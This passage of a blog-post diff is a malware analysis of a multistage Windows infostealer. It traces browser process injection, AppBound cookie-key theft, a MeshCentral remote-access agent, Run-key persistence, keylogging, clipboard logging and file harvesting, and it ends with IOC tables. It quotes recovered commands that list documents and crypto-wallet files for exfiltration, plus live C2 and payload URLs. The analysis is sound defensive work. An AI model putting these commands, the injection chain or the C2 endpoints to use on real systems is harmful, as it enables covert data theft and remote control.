+                        <tbody>
+                            <tr>
+                                <td>0x1C</td>
+                                <td>%LOCALAPPDATA%</td>
+                            </tr>
+                            <tr>
+                                <td>0x26</td>
+                                <td>C:\Program Files</td>
+                            </tr>
+                            <tr>
+                                <td>0x2A</td>
+                                <td>C:\Program Files (x86)</td>
+                            </tr>
+                        </tbody>
+                    </table>
+                    <p>
+                        The execution begins by loading several values into buffers. Based on the disassembler's
+                        interpretation amongst other values, a file path and filename are loaded from memory. Next, a
+                        file is downloaded from Google Drive and saved in <code>%LOCALAPPDATA%</code> and named
+                        <code>app</code>.
+                        <br><br>
+                        If the download operation succeeded, execution pauses for 1000 milliseconds. Once execution
+                        resumes, two buffers are pre-cleared using <code>memset</code>, each with a size of 259 bytes.
+                        In the first buffer, the string
+                        <code>C:\Program Files\Google\Chrome\Application\Chrome.exe</code> is loaded.
+                        In the second buffer, the string
+                        <code>C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe</code> is loaded.
+                        Subsequently, the function <code>sub_180001DE0</code> is called twice. For each time, the
+                        <code>app</code> file as well as one of the buffers is passed.
+                        <br><br>
+                        Since the goal and impact of sub_180001DE0 is significant, we will first wrap up our
+                        analysis of <code>z</code>. Once execution resumes in the <code>z</code> function, the
+                        <code>app</code> file is deleted. Next, four new strings are created, each pointing to a unique
+                        location on the system.
+                    </p>
+                    <ul>
+                        <li><code>C:\Windows\System32\TaskMgr.exe</code></li>
+                        <li><code>%LOCALAPPDATA%\Temp\TaskMgr.exe</code></li>
+                        <li><code>%LOCALAPPDATA%\Temp\Taskmgr.msh</code></li>
+                        <li><code>%LOCALAPPDATA%\rem</code></li>
+                    </ul>
+                    <img class="lazy" data-src="/img/multistage_buffers.png" alt="Buffers from appload.dll">
+                    <br><br>
+                    <p>
+                        Subsequently, a new file is downloaded using a second unique Google Drive link and the file
+                        is stored in <code>%LOCALAPPDATA%\rem</code>. If this download operation succeeded, using
+                        another Google Drive link, another file will be downloaded and stored in
+                        <code>%LOCALAPPDATA%\temp\Taskmgr.msh</code>.
+                        <br>
+                        Once again, a check is performed to ensure the download succeeded. If success is confirmed,
+                        the <code>Taskmgr.msh</code> file is opened in <code>rb</code> mode and both the file pointer
+                        and its open handle are passed to <code>sub_180001670</code>. This function performs in-place
+                        RC4 decryption of the downloaded file. The first 16 bytes of the file represent the RC4 key
+                        which is used to decrypt the remaining data.
+                        <br><br>
+                        Once in-place decryption has completed, <code>_access_s</code> is used to check if the file
+                        <code>Taskmgr.msh</code> exists. If existence is confirmed, the contents of the file
+                        <code>C:\Windows\System32\TaskMgr.exe</code> is copied into
+                        <code>%LOCALAPPDATA%\Temp\TaskMgr.exe</code> using <code>CopyFileA</code>.
+                        <br>
+                        Subsequently, function <code>sub_180001DE0</code> is called and receives the pointers to the
+                        <code>rem</code> and soon-to-be-malicious <code>TaskMgr.exe</code>.
+                    </p>
+
+                    <h4 id="section2.2.1"> Understanding function sub_180001DE0</h4>
+                    <p>
+                        Function <code>sub_180001DE0</code> is central to understanding the goal this DLL aims
+                        to achieve. This function receives two input parameters. The first parameter contains the
+                        downloaded file, while the second parameter contains the name of a process (either:
+                        <code>chrome.exe</code>, <code>msedge.exe</code> or <code>Taskmgr.exe</code>).
+                        <br><br>
+                        Each of the downloaded files is RC4 encrypted and decryption is one of the first steps. Each
+                        of the files has the corresponding RC4 decryption key embedded and is 16 bytes long. Each key
+                        is located at offset 0 of each file. Therefore, to decrypt the files, we extract the 16-byte
+                        key and decrypt the remaining contents.
+                        <br><br>
+                        Next, based on the following actions we can assume that each of the files is an executable
+                        in PE-COFF format, as we see multiple checks taking place where specific offsets in the
+                        decrypted buffers are tested against values such as <code>0x5A4D</code> and <code>0x4550</code>.
+                        <br><br>
+                        Once decryption succeeds and the decrypted buffer is confirmed to contain a valid PE file,
+                        function <code>sub_180005B70</code> is called. This function calls <code>CreateProcessA</code>
+                        using the process path supplied as the second argument.
+                        <br><br>
+                        If process creation succeeds, <code>sub_180001B90</code> locates the target process's main
+                        module and calls <code>sub_180005840</code>. This last function performs a classic process
+                        injection.
+                        <br>
+                        This routine changes memory protections using <code>VirtualProtectEx</code>, enabling read/write
+                        access on the base address of the process. If this is successful, it will overwrite the target
+                        process memory with <code>WriteProcessMemory</code>, and performs additional checks to reduce
+                        the likelihood of a crash. If this has been confirmed, control is returned to <code>z</code>.
+                        <br><br>
+                        Basically, this means that the RC4-decrypted contents of <code>app</code> gets injected
+                        into <code>chrome.exe</code> and <code>msedge.exe</code>. Furthermore, the contents of
+                        <code>rem</code> gets injected into a copied version of <code>taskmgr.exe</code>.
+                        <br>
+                        The next step would now be to analyze both executables and determine what actions are
+                        performed by these implants.
+                    </p>
+
+                    <h3 id="section2.3">Edge and Chrome Implant Analysis</h3>
+                    <p>
+                        During the analysis of the <code>1.ps1</code> we mentioned how after executing
+                        <code>appload.dll</code>, the script would upload the files: <code>cc_appkey</code>,
+                        <code>ee_appkey</code> and <code>tmpgoochr.zip</code> to the C2 server. So far in our
+                        analysis, we have not yet come across these values.
+                        <br><br>
+                        However, by doing a simple analysis on the Edge & Chrome implant, we see both the
+                        string <code>tmpgoochr</code> and concat actions for <code>ee</code> and <code>cc</code> with
+                        <code>_appkey</code>. Furthermore, we see that the pdb path points to
+                        <code>Z:\Workspace\VC\1\AppBound\x64\Release\AppBoundDecrypt.pdb</code>. Based on
+                        this, searching for "AppBound" returns a <a
+                            href="https://www.cyberark.com/resources/threat-research-blog/c4-bomb-blowing-up-chromes-appbound-cookie-encryption">post
+                            by CyberArk</a> where they cover a new feature introduced by Google to better protect
+                        cookies named "AppBound Cookie Encryption". It discusses a new attack vector which allows to
+                        decrypt the cookies as a low-privileged user. Additionally, <a
+                            href="https://www.elastic.co/security-labs/katz-and-mouse-game">research by Elastic
+                            Labs</a> shows multiple techniques for bypassing Google's App-Bound Encryption.
+                        <br>
+                        This includes a technique which attempts to elevate to <code>SYSTEM</code>, then decrypting
+                        <code>app_bound_encryption_key</code> which is another string we locate within the implant.
+                        <br><br>
+                        Without spending too much time on this specific implant, we can reasonably assume based on
+                        some light static and string analysis, that this implant supports the decryption of AppBound
+                        keys in Chrome, MsEdge and Naver Whale, which then get stored in the aforementioned files before
+                        they get exfiltrated to the C2 server.
+                    </p>
+
+                    <h3 id="section2.4">TaskMgr Implant Analysis</h3>
+                    <p>
+                        So far, we have not further discussed the contents of the <code>Taskmgr.msh</code> file.
+                        After RC4 decrypting its contents, we are presented with the following clear-text contents:
+                    </p>
+                    <pre><code class="lang-text">MeshName=mycoms
+MeshType=2
+MeshID=0xAFC6ADEAE42BE9C75274C0F6DC503464C6F4FB6D6B77521A6B46AA9CAD91FBBA03D0E6B38F5D5BEADA64E2682C3301B8
+ServerID=5A93B1A29F38C43CA42FED5728745C081D04C8390C54525545E10FDECE40C6FCF39941AE33F1C852A596B4418E6CD078
+MeshServer=wss://googleoba.servequake.com:8443/agent.ashx
+InstallFlags=2
+translation={... translation object here ...}</code></pre>
+                    <p>
+                        Based on the file extension <code>.msh</code> and the clear-text contents, it becomes
+                        apparent that this file is configuration file for MeshCentral / Mesh Agents which is an <a
+                            href="https://docs.meshcentral.com/">open-source computer management platform</a>. As
+                        such, it provides a 'seamless web-based experience for remote desktop access, terminal control,
+                        and file management' and could be abused by threat actors for a hands-on remote access tool.
+                        <br><br>
+                        With this knowledge, we can work with the hypothesis that the <code>taskmgr.exe</code> is
+                        likely the Mesh Agent, allowing threat actor control over the compromised host.
+                        <br><br>
+                        By opening <code>taskmgr.exe</code> in PEStudio, and browsing to the Version Information, we see
+                        general information confirming our hypothesis that this is the MeshCentral Agent.
+                        <br><br>
+                        <img class="lazy" data-src="/img/multistage_pestudio.png" alt="MeshCentral PEStudio">
+                        <br><br>
+                        Furthermore, if we inspect the certificate used to sign the executable, we see that the
+                        certificate was issued by <code>MeshCentralRoot-fa691c</code>
+                        <br><br>
+                        <img class="lazy" data-src="/img/multistage_meshcert.png" alt="MeshCentral Certificate">
+                        <br><br>
+                    </p>
+
+                    <h2 id="section3">Microsoft Defender is disabled</h2>
+                    <p>
+                        If Microsoft Defender is disabled, the script will download the <code>user.txt</code> and
+                        <code>sys.log</code> files. Once the download has completed, the <code>sys.log</code> file will
+                        be AES decrypted and the output is stored in <code>sys.dll</code>.
+                        <br>
+                        This DLL then gets called using <code>rundll32 sys.dll,k</code>. Note the <code>k</code> at the
+                        end, this denotes the specific function that is being called. For DLL files, these functions
+                        need to be exported. Therefore, we can use any debugger (like IDA) to find <code>k</code> and
+                        start our analysis.
+                    </p>
+
+                    <h3 id="section3.1">Analyzing sys.dll</h3>
+                    <p>
+                        The <code>sys.dll</code> follows much of the same logic as the <code>appload.dll</code>. However
+                        there are some noteworthy differences. First, at the start of the <code>k</code> function, two
+                        anti-analysis checks are performed which determine if the DLL is running in either a VirtualBox
+                        or VMWware environment. If this is the case, the process will terminate itself and remove itself
+                        from disk.
+                        <br><br>
+                        If it is not running in a virtualized environment, it will create a unique mutex named
+                        <code>ilaknkia</code>.
+                        <br>
+                        Subsequently, it will create two threads and each of these threads attempts to run the
+                        <code>net</code> or <code>taskmgr</code> injections we previously analysed. With these threads
+                        running, it will RC4 decrypt the <code>user.txt</code> file which was the first file that was
+                        downloaded from the PowerShell script. This script contains 3 Google Drive URLs each containing
+                        a specific file to download.
+                        <br><br>
+                        One of these files, <code>app64.log</code> we previously saw and this file will once again be
+                        saved to <code>%LOCALAPPDATA%\app</code>. The two new files, <code>net64.log</code> will be
+                        saved in <code>%LOCALAPPDATA%\net</code> and <code>main64.log</code> will be saved in
+                        <code>%LOCALAPPDATA%\notepad.log</code>.
+                        <br><br>
+                        As we previously saw, <code>app</code> will be used to inject into both <code>chrome.exe</code>
+                        and <code>msedge.exe</code>. We further note that this DLL is UPX packed and when unpacked is
+                        rather large in size and, amongst others, contains multiple SQL statements. We will not further
+                        analyze this DLL as we will work under the assumption that once again this is likely used to
+                        obtain value data from both Chrome and Edge.
+                        <br><br>
+                        Whereas <code>notepad.log</code> will be copied into <code>notepad.tmp</code>
+                    </p>
+
+                    <h3 id="section3.2">Analyzing notepad.tmp</h3>
+                    <p>
+                        In <code>DllMain</code> we observe how multiple buffers are loaded with specific filenames and
+                        destinations, partially based on the results of <code>sub_180001FA0</code>. Some filenames
+                        and destinations that can be identified based on static analysis:
+                    </p>
+                    <table>
+                        <thead>
+                            <th colspan="3">File names and folder paths</th>
+                        </thead>
+                        <tbody>
+                            <tr>
+                                <td>C:\Program Files</td>
+                                <td>%LOCALAPPDATA%</td>
+                                <td>%APPDATA%</td>
+                            </tr>
+                            <tr>
+                                <td>C:\Users\&lt;user&gt;\AppData\Roaming\Microsoft\Windows\Recent</td>
+                                <td>netkey</td>
+                                <td>netlist.log</td>
+                            </tr>
+                            <tr>
+                                <td>C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup</td>
+                                <td>history.log</td>
+                                <td>tmp</td>
+                            </tr>
+                            <tr>
+                                <td>netie</td>
+                                <td>ies</td>
+                            </tr>
+                        </tbody>
+                    </table>
+                    <p>
+                        After these operations completed, <code>sub_180001D80</code> is called. This function downloads
+                        a new file from a new Google Drive link. This file is RC4-encrypted and after decrypting, we
+                        notice how it contains a new C2 URL: <code>https[:]//pxqtkc.corpsecs.com/</code>. Additionally,
+                        it will call <code>GetVolumeInformation</code> to obtain the VolumeSerialNumber. This
+                        VolumeSerialNumber will be used to create a unique fingerprint when contacting the C2 server to
+                        identify the target system.
+                        <br><br>
+                        Note that if the VolumeSerialNumber cannot be obtained, it will instead obtain the name of the
+                        target system using <code>GetComputerNameA</code> and the current user's username using
+                        <code>GetUserNameA</code> which can be used for further identification. Based on
+                        <code>sub_180002690</code> it appears that this is also part of the unique URI that will be
+                        constructed to send to the C2 server and create a unique URI for communication and exfiltration.
+                    </p>
+
+                    <h4 id="section3.2.1">Creating persistence</h4>
+                    <p>
+                        Next, from DllMain, function <code>sub_1800021A0</code> is called from which attempts to achieve
+                        persistence by creating a registry key in
+                        <code>HKCU\Software\Microsoft\Windows\CurrentVersion\Run</code> with
+                        a name of <code>NetService</code> and a value of <code>rundll32 %LOCALAPPDATA%\sys.dll,k</code>.
+                    </p>
+                    <img src="/img/multistage_notepad_persistence.png" alt="Notepad Persistence">
+                    <br><br>
+
+                    <h4 id="section3.2.2">Keylogging capabilities</h4>
+                    <p>
+                        Lastly, <code>DllMain</code> calls function <code>a</code>. In this function we identify the
+                        creation of four threads. Two of these threads call <code>sub_180006620</code> and
+                        <code>sub_180006650</code> respectively. The former basically acts as a keylogger. It will
+                        first check if another key has been pressed since the last check for a pressed key occurred. It
+                        then attempts to obtain the foreground window and obtains the window's title bar. The latter
+                        writes the results of the intercepted keystrokes to the logfile.
+                    </p>
+                    <img src="/img/multistage_notepad_keylogger.png" alt="Notepad Keylogger">
+                    <br><br>
+                    <p>
+                        Furthermore, function <code>sub_1800024C0</code> acts as a clipboard monitor and logger. It
+                        checks the clipboard every 50ms and computes a hash of the current contents to avoid duplicate
+                        entries. If the hash differs from the previously stored value, the function writes the clipboard
+                        contents to the log file, wrapping each entry in <code>[[</code> and <code>]]</code>.
+                    </p>
+                    <img src="/img/multistage_clipboardstealer.png" alt="Clipboard Stealer">
+                    <br><br>
+
+                    <h4 id="section3.2.3">File indexer</h4>
+                    <p>
+                        The last function that gets its own thread is <code>StartAddress</code> which is only a wrapper
+                        for 10 functions that run in an endless loop spaced out by a sleep of 30 seconds.
+                        One of these functions, <code>sub_1800082E0</code>, attempts to identify file paths of interest,
+                        which it will store in <code>netlist.log</code> for exfiltration purposes.
+                        <br>
+                        Actual exfiltration subsequently occurs in function <code>sub_180003140</code>
+                    </p>
+                    <table>
+                        <thead>
+                            <th colspan="3">Unique file search commands</th>
+                        </thead>
+                        <tbody>
+                            <tr>
+                                <td><code>"cmd /c @for /f \"delims=\" %%i in ('dir %s\\extensions /ad /b /s') do @echo %%i >>
+                                    \"%s\" & @dir \"%%i\" /ad /b >> \"%s\""</code></td>
+                            </tr>
+                            <tr>
+                                <td><code>"cmd.exe /c for %%i in (hwp pdf doc docx xls xlsx zip rar egg txt jpg png jpeg alz
+                                    ldb log) do dir \"%s*.%%i\" /s >> \"%s\""</code></td>
+                            </tr>
+                            <tr>
+                                <td><code>"cmd.exe /c for %%i in (hwp pdf doc docx xls xlsx zip rar egg txt jpg png jpeg alz
+                                    ldb log) do dir \"%s*.%%i\" /s >> \"%s\""</code></td>
+                            </tr>
+                            <tr>
+                                <td><code>"cmd.exe /c dir %s*wallet* %sUTC--* /s >> \"%s\""</code></td>
+                            </tr>
+                        </tbody>
+                    </table>
+
+                    <h4 id="section3.2.4">Information gathering</h4>
+                    <p>
+                        The first function that is called from the <code>StartAddress</code> thread is
+                        <code>sub_180005DC0</code>. This function creates a zip file in <code>%LOCALAPPDATA%</code>
+                        named <code>micro.zip</code>. Furthermore, it will download <code>history.log_</code> from the
+                        C2 server. Next, function <code>sub_180004040</code> is called which performs information
+                        gathering.
+                        <br><br>
+                        It will gather the hostname, current IP addresses, computername and current user's username. It
+                        then continues by obtaining the integrity level of its own process by calling
+                        <code>GetTokenInformation</code> and <code>GetSidSubAuthority</code>.
+                        <br><br>
+                        Furthermore, using <code>RegOpenKey</code> and <code>RegQueryValueExA</code> the
+                        <code>ConsentPromptBehaviourAdmin</code> value will be obtained which determines the UAC level.
+                        <br><br>
+                        Continuing, all logical drives are collected including volume information and drive types. It
+                        also collects the ProductName and the DisplayVersion, using registry key
+                        <code>HKLM\Software\Microsoft\Windows NT\CurrentVersion</code>. The System type (32/64-bit)
+                        will be obtained using API <code>GetSystemWow64DirectoryA</code> and further CPU information is
+                        obtained.
+                        <br><br>
+                        Additionally, all paths and filenames in the Start Menu and in the Recent folder and all
+                        applications in <code>HKLM\Software\Classes\Installer\Products</code> are obtained.
+                        <br><br>
+                        This information is subsequently exfiltrated using <code>sub_180003140</code>.
+                    </p>
+
+                    <h4 id="section3.2.5">Additional Commands and Implants</h4>
+                    <p>
+                        From <code>sub_180007BE0</code> we learn that the C2 server can be used for active execution of
+                        commands. Queries performed to <code>/cmd</code> are RC4 encrypted and upon decryption will be
+                        executed using a format string <code>cmd /c %s</code> and API call to
+                        <code>CreateProcessA</code>.
+                        <br><br>
+                        In function <code>sub_180006930</code>, further C2 communication can be observed. A file named
+                        <code>out</code> will be retrieved from the C2 server and based on the calls afterwards, it
+                        appears highly likely that the contents of this file is also RC4-encrypted.
+                        Similar actions are also observed in <code>sub_180007220</code>, which obtains <code>in</code>
+                        from the C2 server and this file also appears to be RC4-encrypted.
+                        <br><br>
+                        The same applies to <code>sub_180007E70</code> which downloads <code>cok</code> from the C2
+                        server and stores it locally as <code>net</code> in <code>%LOCALAPPDATA%</code>. It also appears
+                        highly likely that the contents of this file is also RC4-encrypted.
+                        <br><br>
+                        Similar behavior can be observed in <code>sub_180007490</code> where a file named
+                        <code>dir</code> is retrieved from the C2 server and decrypted. Furthermore, a new file called
+                        <code>list.log</code> is created in <code>%LOCALAPPDATA%</code> which is then filled with a list
+                        of files obtained from two commands being executed using <code>CreateProcessW</code>:
+                        <br>
+                        <code>"cmd.exe /c for %%i in (hwp pdf doc docx xls xlsx zip rar egg txt jpg png jpeg alz ldb log) do dir "
+                       "\"%s*.%%i\" /s >> \"%s\""</code>
+                        <br><br>
+                        <code>"cmd.exe /c dir %s*wallet* %sUTC--* /s >> \"%s\""</code>
+                        <br>
+                        Once again, <code>sub_180003140</code> is then used for exfiltration and deletion of the file.
+                    </p>
+
+                    <h4 id="section3.2.6">TaskMgr Implant</h4>
+                    <p>
+                        In function <code>sub_180008060</code>, we identify the same URL and filenames we previously saw
+                        for the TaskMgr implant. Since we are now in the Defender is disabled stream, it makes sense to
+                        see similar actions between both streams. Please refer to the <a href="#section2.4">TaskMgr
+                            Implant Analysis</a> section for a detailed write-up.
+                    </p>
+
+                    <h2 id="section4">Indicators of Compromise</h2>
+                    <h3>File Hashes - SHA256</h3>
+                    <table>
+                        <thead>
+                            <tr>
+                                <th>IOC</th>
+                                <th>Hash</th>
+                                <th>Description</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            <tr>
+                                <td>password.txt.lnk</td>
+                                <td>2f59c97372c4c49c8350501814b8091dfab2b2adee75a94d9071ff2f85640e4a</td>
+                                <td>Malicious LNK file calling PowerShell to execute mshta</td>
+                            </tr>
+                            <tr>
+                                <td>pwko.zip</td>
+                                <td>C5785A0D0D5995F4A85EEB7D6A63183234B39DF49D2A235A4C77F6C9026F27FF</td>
+                                <td>Second stage payload downloaded from Github - actually a obfuscated HTA
+                                    script
+                                </td>
+                            </tr>
+                            <tr>
+                                <td>password.txt</td>
+                                <td>912FC71662D52486838562581C3F44219A8E7B053590B13D4EDFBFC67E953D68</td>
+                                <td>Encrypted payload download from Google Drive from the HTA script</td>
+                            </tr>
+                            <tr>
+                                <td>user.txt</td>
+                                <td>0E1F40D7459D0DF0C739AA3F793CA3D556DB44A474613299F96E96BFA6657160</td>
+                                <td>Encrypted payload download from Google Drive if Microsoft Defender is disabled
+                                </td>
+                            </tr>
+                            <tr>
+                                <td>sys.log</td>
+                                <td>22763195037DD87C25F1217E6D0E457DBBC52C58404D71B73600789E48EA9968</td>
+                                <td>Encrypted payload downloaded from Google Drive if Microsoft Defender is
+                                    disabled
+                                </td>
+                            </tr>
+                            <tr>
+                                <td>sys.dll</td>
+                                <td>9758E76B601798A30D903BF05052A53DF80451E5C156548CE9DA828F608B6470</td>
+                                <td>Decrypted payload from sys.log</td>
+                            </tr>
+                            <tr>
+                                <td>pipe.log</td>
+                                <td>94D48FC67183A649D0B1F41F5790B64BA301D9499C81032E855E91CCC645778B</td>
+                                <td>Second stage encrypted payload downloaded from Github if Microsoft Defender is
+                                    not disabled</td>
+                            </tr>
+                            <tr>
+                                <td>pipe.zip</td>
+                                <td>25BEADD482FC8F1831AB7B32280E30BC8DCFC0C4B120363E7BA64BD0A87CBF46</td>
+                                <td>Second stage decrypted payload downloaded from Github if Microsoft Defender is
+                                    not disabled</td>
+                            </tr>
+                            <tr>
+                                <td>1.log</td>
+                                <td>EC12BAD4E691BF62FB8528324FE14328BA6E32C54AC365070CE941A7509A90C4</td>
+                                <td>Part of the contents in the pipe.zip</td>
+                            </tr>
+                            <tr>
+                                <td>1.ps1</td>
+                                <td>3C7A0904C80ECB0F28F89453F4BFBE09AECDDA646FE9BCEB154670E92F51A95E</td>
+                                <td>Part of the contents in the pipe.zip</td>
+                            </tr>
+                            <tr>
+                                <td>2.log</td>
+                                <td>ED3CE0D3307446B23AA7CCDB977A4648DB1CB64BD9305BAE20061B59F97177B2</td>
+                                <td>Part of the contents in the pipe.zip</td>
+                            </tr>
+                            <tr>
+                                <td>pserver.log / serverenc.log</td>
+                                <td>73BCFE9209ED2BC8CE817319091C53F68DFD892B67BC77B4012CC35B09174719</td>
+                                <td>Third stage AES encrypted payload downloaded using 1.ps1 and 1.log</td>
+                            </tr>
+                            <tr>
+                                <td>appload.log</td>
+                                <td>10781A32A608150E81108FB56469B836894435C0516A03628E9F62D950CBB37F</td>
+                                <td>Third stage AES encrypted payload downloaded using 1.ps1 and 1.log</td>
+                            </tr>
+                            <tr>
+                                <td>appload.dll</td>
+                                <td>943E3D0534EB4EE6401CDD060BC35EDA394757457F1F1BBC5542D93C5901B4D1</td>
+                                <td>Third stage AES decrypted payload downloaded using 1.ps1 and 1.log</td>
+                            </tr>
+                            <tr>
+                                <td>agent.log</td>
+                                <td>FBBF6C23BB48E0F178C5097483B92459C9288E9B08E9733FE6F31E861FB43BFF</td>
+                                <td>Fourth stage RC4 encrypted payload downloaded by appload.dll</td>
+                            </tr>
+                            <tr>
+                                <td>msh.log</td>
+                                <td>802E8519A279FE9637D66F225FBE8B6B02055156C8F5EA3275922966BB734F18</td>
+                                <td>Fourth stage RC4 encrypted payload downloaded by appload.dll</td>
+                            </tr>
+                            <tr>
+                                <td>app64.log</td>
+                                <td>F58B089C8BB8DE31CE9887A6B700B0106259C29156BED56EC5CCE1B7E2128BBD</td>
+                                <td>Fourth stage RC4 encrypted payload downloaded by appload.dll</td>
+                            </tr>
+                            <tr>
+                                <td>RC4 Decrypted executable from app64.log</td>
+                                <td>221A39856B37E3C682F62427F1E6B965B36A2405764689C914672770A01A1FA9</td>
+                                <td>Fourth stage RC4 decrypted payload originating from app64.log</td>
+                            </tr>
+                            <tr>
+                                <td>RC4 decrypted contents from msh.log</td>
+                                <td>D9F19F2D4823435DE6EE295900060235DC0ACC7BAA4472CA47F14CE9795B5258</td>
+                                <td>Fourth stage RC4 decrypted payload originating from msh.log</td>
+                            </tr>
+                            <tr>
+                                <td>RC4 decrypted contents from agent.log</td>
+                                <td>221A39856B37E3C682F62427F1E6B965B36A2405764689C914672770A01A1FA9</td>
+                                <td>Fourth stage RC4 decrypted payload originating from agent.log</td>
+                            </tr>
+                            <tr>
+                                <td>main64.log</td>
+                                <td>78BFB92939BCBF1E9564D7667BBA49AEB5761F874534BB7EF084BC73E61DFE33</td>
+                                <td>Fourth stage RC4 encrypted payload downloaded by sys.dll</td>
+                            </tr>
+                            <tr>
+                                <td>net64.log</td>
+                                <td>B6C5F08F301A11C9944E4A93BB6E4763921D80B6AB72EB41A25A4308C820B07D</td>
+                                <td>Fourth stage RC4 encrypted payload downloaded by sys.dll</td>
+                            </tr>
+                            <tr>
+                                <td>app - RC4 decrypted payload main64.log</td>
+                                <td>51C08F48664DCDF0B7F142747803F30546E7E166F1544200A78BE1BB9D6F7B80</td>
+                                <td>Fourth stage RC4 decrypted payload downloaded by sys.dll</td>
+                            </tr>
+                            <tr>
+                                <td>net - RC4 decrypted payload net64.log</td>
+                                <td>06DA829551D14E9264699CDFBCEB26FA8B705DCD489E5A42ACB7FFCF651FC681</td>
+                                <td>Fourth stage RC4 decrypted payload downloaded by sys.dll</td>
+                            </tr>
+                            <tr>
+                                <td>net.dll</td>
+                                <td>01EEA91C45E7C8CB08067FA3774DD0104FD44B16B10DD1972F4DDBC869BBD60E</td>
+                                <td>Fourth stage UPX unpacked payload downloaded by sys.dll</td>
+                            </tr>
+                        </tbody>
+                    </table>
+
+                    <h3>URLs and IP Addresses</h3>
+                    <table>
+                        <thead>
+                            <tr>
+                                <th>URL/IP address</th>
+                                <th>Description</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            <tr>
+                                <td>https[:]//link24.kr/H6jyzZe</td>
+                                <td>URL shortener redirecting to Github</td>
+                            </tr>
+                            <tr>
+                                <td>https[:]//github.com/daldalkim/cuddly-octo-waddle/releases/download/v1.0.0/pwko.zip?v=6a1cd1078886f3.98521610
+                                </td>
+                                <td>Downloads pwko.zip</td>
+                            </tr>
+                            <tr>
+                                <td>https[:]//drive.google.com/uc?export=download&id=1u0g1doVUDc5VCeP653aze60SGlhs3efQ
+                                </td>
+                                <td>Downloads password.txt</td>
+                            </tr>
+                            <tr>
+                                <td>https[:]//drive.google.com/uc?export=download&id=116azn_9bUov3mkSORbPk8_4zIVVNBHZn
+                                </td>
+                                <td>Downloads sys.log</td>
+                            </tr>
+                            <tr>
+                                <td>https[:]//drive.google.com/uc?export=download&id=1jqpw8UHpsY5ps3nKOfkyo2ql4hC23Mew
+                                </td>
+                                <td>Downloads pipe.log</td>
+                            </tr>
+                            <tr>
+                                <td>https[:]//drive.google.com/uc?export=download&id=1x9mkl4q9ZU8_hDPNF5w0Mu8ePxVWI5VJ
+                                </td>
+                                <td>Downloads user.txt</td>
+                            </tr>
+                            <tr>
+                                <td>https[:]//drive.google.com/uc?export=download&id=1FA9TvcakCgfeRdLaejIJbeoFjuI9GB6R
+                                </td>
+                                <td>Downloads serverenc.log</td>
+                            </tr>
+                            <tr>
+                                <td>https[:]//drive.google.com/uc?export=download&id=15Xkvt3TwCQJERcUHSUandCigMVVxsFqr
+                                </td>
+                                <td>Downloads appload.log</td>
+                            </tr>
+                            <tr>
+                                <td>https[:]//lutkdd.corpsecs.com/</td>
+                                <td>C2 server used for uploading gathered information and files</td>
+                            </tr>
+                            <tr>
+                                <td>https[:]//drive.google.com/uc?export=download&id=176jQJH3H3DHPzjFI-tIjrV8KLtEBgY_m
+                                </td>
+                                <td>Downloads msh.log</td>
+                            </tr>
+                            <tr>
+                                <td>https[:]//drive.google.com/uc?export=download&id=1rqN7zYXO0jNSsZy8gSECxSxY57T0T_xr
+                                </td>
+                                <td>Downloads agent.log</td>
+                            </tr>
+                            <tr>
+                                <td>https[:]//drive.google.com/uc?export=download&id=1EkyeoSdhvGqcEpZkqBUzXnJYPLka7zJc
+                                </td>
+                                <td>Downloads app64.log</td>
+                            </tr>
+                            <tr>
+                                <td>wss://googleoba.servequake.com:8443/agent.ashx</td>
+                                <td>Websocket connection setup by MeshCentral Agent</td>
+                            </tr>
+                            <tr>
+                                <td>https[:]//drive.google.com/uc?export=download&id=1veetviG-ft9tfOqAyOlHLSa55V2YR-GJ
+                                </td>
+                                <td>Downloads RC4-encrypted main64.log</td>
+                            </tr>
+                            <tr>
+                                <td>https[:]//drive.google.com/uc?export=download&id=1PTs95g2gr6dIuO2RqErgGutQZv2Y0g3Y
+                                </td>
+                                <td>Downloads RC4-encrypted net64.log</td>
+                            </tr>
+                            <tr>
+                                <td>https[:]//drive.google.com/uc?export=download&id=1moNyXp9NAyu_iEFfZMoPHVDWptxzjgbn
+                                </td>
+                                <td>Downloads RC4-encrypted u.log</td>
+                            </tr>
+                            <tr>
+                                <td>https[:]//pxqtkc.corpsecs.com/</td>
+                                <td>C2 server downloaded from Google Drive using u.log by notepad.tmp </td>
+                            </tr>
+                        </tbody>
+                    </table>
+                </div>
+            </article>
+        </div>
+        <!-- end post -->
+    </main>
+    <!-- End of custom content -->
+
+    <div class="top" title="Top"><i class="ion ion-ios-arrow-up"></i></div>
+    <!-- begin footer-widgets -->
+    <section class="footer-widgets">
+        <div class="container">
+            <div class="row">
+                <div class="col col-4 col-d-6 col-t-12">
+                    <div class="widget widget-tag-cloud">
+                        <div class="widget__head">
+                            <h3 class="widget__title">Explore Tags</h3>
+                        </div>
+                        <div class="tag__cloud">
+                            <a href="/re" class="set-1">Reverse Engineering</a>
+                            <a href="/projects" class="set-1">Projects</a>
+                            <a href="/ctf/" class="set-5">CTF Writeups</a>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+    <!-- end footer-widgets -->
+    <!-- begin footer -->
+    <footer class="footer">
+        <div id="footer-content"></div>
+    </footer>
+    <!-- end footer -->
+
+    <script src="/js/vendors/jquery-3.5.1.min.js"></script>
+    <script src="/js/vendors/simple-jekyll-search.min.js"></script>
+    <script src="/js/vendors/jquery.fitvids.js"></script>
+    <script src="/js/vendors/lazyload.min.js"></script>
+    <script src="/js/vendors/transition.js"></script>
+    <script src="/js/vendors/zoom.min.js"></script>
+    <script src="/js/vendors/prism.js"></script>
+    <script src="/js/common.js"></script>
+    <script src="/js/readingtime.js"></script>
+</body>
+
+</html>
